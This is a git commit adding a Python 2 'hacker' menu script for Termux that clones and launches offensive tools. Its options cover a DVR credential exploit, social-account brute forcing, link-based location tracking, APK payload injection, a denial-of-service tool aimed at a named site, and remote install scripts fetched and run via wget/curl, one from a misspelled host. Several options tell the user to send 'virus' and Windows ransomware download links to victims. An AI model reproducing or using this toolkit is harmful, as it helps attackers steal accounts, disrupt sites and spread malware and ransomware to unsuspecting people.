23a71c766ce67394db3c16c56691e2c00d3c7005
yehia hacker <42983220+yehia-hacker@users.noreply.github.com>
2018-12-26 13:56:51 -0800

    Add files via upload

---
+++ yehia1hacker.py
@@ -0,0 +1,310 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import os
+import sys
+
+
+os.system("apt install mpv")
+os.system("mpv M500.mp3")
+print(""" \033[1;36m
+----------------------------------------------------------------------------
+                             Yehia hacker
+
+----------------------------------------------------------------------------\033[1;m""")
+def main():
+
+  	print("\033[0;101mplease input Number\033[1;90m")
+        print("   VERSION < 1 >    2019      ")
+	print("""
+
+😵\033[0;102m1--informations image\033[0;90m
+
+🤩\033[0;100m2--Breakthrough Cameras DVR\033[0;37;41m
+
+🤬\033[0;101m3--\033[0;37;46m--Hacking soical networking Account\033[0;33m
+
+👽\033[1;91m4--Specify a persons adress via a Link
+
+💀\033[42m5--injection Applications
+
+👻\033[4;37m6--Hack through Link
+
+👺\033[40m7--Dropping sites
+
+🕴 \033[0;101m8--dismantling Hash\033[0;37;46m
+
+👨\033[44m9--install kali nethunter\033[0;37;46m
+
+🖲️ \033[43m10-- Check infected sites\033[0;37;46m
+
+📂\033[40m11-- Decrypt python\033[0;37;46m
+
+🔊\033[1;92m12-- install metasploit< ARM\033[0;37;46m
+
+📱\033[1;31m13-- Install METASPLOIT in Termux\033[0;37;46m
+
+🔔\033[0;33m14-- Link Virus  ( Warning dont install link  )\033[0;37;46m
+
+📟\033[0;101m15-- Text Forms\033[0;37;46m
+
+🖲️ \033[1;36m16-- download page website\033[0;37;46m
+
+🕴 ️\033[0;35m17-- Learn Hack system\033[0;37;46m
+
+😎\033[0;101m18-- Learn Make virus and backdor\033[0;37;46m
+
+📶\033[0;37m19-- Learn virus MODERN\033[0;37;46m
+
+🤑\033[0;32m20-- Learn spoffinf in network\033[0;37;46m
+
+🤓\033[0;31m21-- Learn social Engineering\033[0;37;46m
+
+📂\033[0;32m22-- Learn hack website and server\033[0;37;46m
+
+🕹️ \033[0;33m23-- Learn SQL INjection \033[0;37;46m
+
+👿\033[0;101m24-- Learn hack Wifi \033[0;37;46m
+
+🔊\033[0;100m25-- HACK SCREEN DELL\033[0;37;46m
+
+👺\033[43m26-- PORT SCANNER\033[0;37;46m
+
+👨‍\033[42m27-- Command Mail Extraction in Metasploit\033[0;37;46m
+
+📱\033[0;101m28-- Virus System FUll With Link \033[0;37;46m
+
+🐲\033[0;36m29-- Virus clear Files Victim With Link\033[0;37;46m
+
+📶\033[40m30-- WOLF\033[0;37;46m
+
+📀\033[45m31-- Matrix\033[0;37;46m
+
+👾\033[0;101m32-- Play Game\033[0;37;46m
+**\033[1;92mX=EXIT
+""")
+	system0 = raw_input(">>> ")
+	if system0 == "1":
+                    os.system("apt install mpv")
+                    os.system("mpv 1.mp3")
+                    os.system("apt-get install exif")
+                    print("exif name image")
+	elif system0 == "2":
+                  os.system("apt install mpv")
+                  os.system("mpv 2.mp3")
+                  os.system("git clone https://github.com/ezelf/CVE-2018-9995_dvr_credentials")
+                  print("python getDVR_Credentials.py --host IP --port PORT")
+        elif system0 == "3":
+                  os.system("apt install mpv")
+                  os.system("mpv 3.mp3")
+                  os.system("git clone https://github.com/TunisianEagles/SocialBox")
+                  print("cd SocialBox")
+                  print("chmod +x install-sb.sh")
+                  print("./install-sb.sh")
+                  print("bash SocialBox.sh")
+        elif system0 == "4":
+                 os.system("apt install mpv")
+                 os.system("mpv 4.mp3")
+                 os.system("git clone https://github.com/jofpin/trape")
+                 print("cd trape")
+                 print("pip install -r requirements.txt")
+                 print("python trape.py")
+                 print("python trape.py -u https://google.com -p 80")
+        elif system0 == "5":
+                 os.system("apt install mpv")
+                 os.system("mpv 5.mp3")
+                 os.system("git clone https://github.com/jbreed/apkinjector")
+                 print("thanks")
+        elif system0 == "6":
+                 os.system("apt install mpv")
+                 os.system("mpv 6.mp3")
+                 os.system("git clone https://github.com/r00t-3xp10it/venom")
+                 print("cd venom")
+                 print("chmod +x venom.sh")
+                 print("cd aux")
+                 print("chmod +x setup.sh")
+                 print("thanks")
+        elif system0 == "7":
+                 os.system("apt install mpv")
+                 os.system("mpv 7.mp3")
+                 os.system("git clone https://github.com/zanyarjamal/xerxes")
+                 os.system("pkg install clang")
+                 print("cd xerxes")
+                 print("clang xerxes.c -o xerxes")
+                 print("./xerxes facebook.om 80")
+        elif system0 == "8":
+             os.system("apt install mpv")
+             os.system("mpv 8.mp3")
+             os.system("git clone https://github.com/s0md3v/Hash-Buster")
+             print("cd Hash-Buster")
+             print("chmod +x hash.py")
+             print("python2 hash.py")
+        elif system0 == "9":
+             os.system("apt install mpv")
+             os.system("mpv 9.mp3")
+             os.system("git clone https://github.com/Hax4us/Nethunter-In-Termux")
+             print("cd Nethunter-in-Termux")
+             print("chmod +x 777 kalinethunter")
+             print("./kalinethunter")
+             os.system("startkali.sh")
+        elif system0 == "10":
+             os.system("apt install mpv")
+             os.system("mpv 10.mp3")
+             os.system("git clone https://github.com/sqlmapproject/sqlmap")
+             print("cd sqlmap")
+             print("chmod +x 777 sqlmap.py")
+             print("python2 sqlmap.py")
+             print("python2 sqlmap.py -u LINK")
+        elif system0 == "11":
+             os.system("apt install mpv")
+             os.system("mpv 11.mp3")
+             os.system("git clone https://github.com/gstarnberger/uncompyle")
+             print("cd uncompyle")
+        elif system0 == "12":
+             os.system("apt install mpv")
+             os.system("mpv 12.mp3")
+             os.system("apt install curl")
+             os.system("pkg install wget")
+             os.system("pkg install ruby")
+             os.system("wget https://Auxilus.github.io/metasploit.sh")
+             os.system("chmod +x metasploit.sh")
+             os.system("./metasploit")
+             os.system("msfconsole")
+             print("end")
+        elif system0 == "13":
+             os.system("apt install mpv")
+             os.system("mpv 13.mp3")
+             os.system("apt install curl")
+             os.system("curl -LO https://raw.githubuserconect.com/Hax4us/Metasploit_termux/master/metasploit.sh")
+             os.system("chmod +x 777 metasploit.sh")
+             os.system("./metasploit.sh")
+             os.system("msfconsole")
+             print("thanks")
+        elif system0 == "14":
+             os.system("apt install mpv")
+             os.system("mpv 14.mp3")
+             print("sent Link to Victim < https://github.com/yehia-hacker/new1hack  >")
+        elif system0 == "15":
+             os.system("apt install mpv")
+             os.system("mpv 15.mp3")
+             os.system("cat arts.txt")
+        elif system0 == "16":
+             os.system("apt install mpv")
+             os.system("mpv 16.mp3")
+             os.system("apt install termux-exec")
+             os.system("wget https://raw.githubuserconect.com/Hax4us/httrsck_in_termux/master/httrack")
+             os.system("bash httrack")
+             os.system("httrack")
+             print("thanks")
+        elif system0 == "17":
+             os.system("apt install mpv")
+             os.system("mpv 17.mp3")
+             print("open file html name< {learn5}")
+             print("open with pdf ")
+             print("<< cp learn5 /sdcard")
+        elif system0 == "18":
+             os.system("apt install mpv")
+             os.system("mpv 18.mp3")
+             print("open file pdf name< [learn6]")
+        elif system0 == "19":
+             os.system("apt install mpv")
+             os.system("mpv 19.mp3")
+             print("open file name < [learn7]")
+        elif system0 == "20":
+             os.system("apt install mpv")
+             os.system("mpv 20.mp3")
+             print("open file name << [learn8]")
+        elif system0 == "21":
+             os.system("apt install mpv")
+             os.system("mpv 21.mp3")
+             print("open file name << [learn9")
+        elif system0 == "22":
+             os.system("apt install mpv")
+             os.system("mpv 22.mp3")
+             print("open file name << [learn12")
+        elif system0 == "23":
+             os.system("apt install mpv")
+             os.system("mpv 23.mp3")
+             print("open file name << [learn14")
+        elif system0 == "24":
+             os.system("apt install mpv")
+             os.system("mpv 24.mp3")
+             print("open file name << [learn15")
+        elif system0 == "25":
+             os.system("apt install mpv")
+             os.system("mpv 25.mp3")
+             os.system("git clone https://github.com/RedBalloonShenanigans/MonitorDarkly")
+             print("thanks")
+        elif system0 == "26":
+             os.system("apt install mpv")
+             os.system("mpv 26.mp3")
+             os.system("chmod +x scan.py")
+             os.system("python scan.py")
+             print("thanks")
+        elif system0 == "27":
+             os.system("apt install mpv")
+             os.system("mpv 27.mp3")
+             print("1- msfconsole")
+             print("2- use gather/search_collector")
+             print("3- set domain facebook.com")
+             print("4- run")
+        elif system0 == "28":
+             os.system("apt install mpv")
+             os.system("mpv 28.mp3")
+             print("A virus that creates many fikes until the memory is full...")
+             print("set LINK to victim [ <  https://github.com/yehia-hacker/new1hacker2019    > ]")
+        elif system0 == "29":
+             os.system("apt install mpv")
+             os.system("mpv 29.mp3")
+             print("Ransomware virus Windows")
+             print("sent link download to victim [ <  https://www.gulf-up.com/dsj7hyxhi89u   >]")
+             print("<<<<< https://www.gulf-up.com/tocz6qo7g0l1")
+        elif system0 == "30":
+             os.system("apt install mpv")
+             os.system("mpv 30.mp3")
+             os.system("git clone https://github.com/yehia-hacker/WOLF")
+             print("cd WOLF")
+             print("chmod +x setup.py")
+             print("user Name = your name")
+             print("password = yehia1hacker")
+        elif system0 == "31":
+             os.system("apt install mpv")
+             os.system("mpv 31.mp3")
+             os.system("pkg install cmatrix")
+             os.system("cmatrix")
+             print("thanks")
+        elif system0 == "32":
+             os.system("apt install mpv")
+             os.system("mpv 32.mp3")
+             os.system("pkg install moon-buggy")
+             os.system("moon-buggy")
+             print("thanks")
+        elif system0 == "x":
+             os.system(" Ctrl + C ")
+             print ("exit script thanks ")
+             print("yehia")
+        else:
+		print("Please select the option 1 or 2")
+
+
+
+		main()
+
+from datetime import datetime
+
+now = datetime.now()
+
+mm = str(now.month)
+
+dd = str(now.day)
+
+yyyy = str(now.year)
+
+hour = str(now.hour)
+
+mi = str(now.minute)
+
+ss = str(now.second)
+
+print ("\033[0;101m--TIME ONLINE --\033[0;37;46m")
+print mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss
+main()
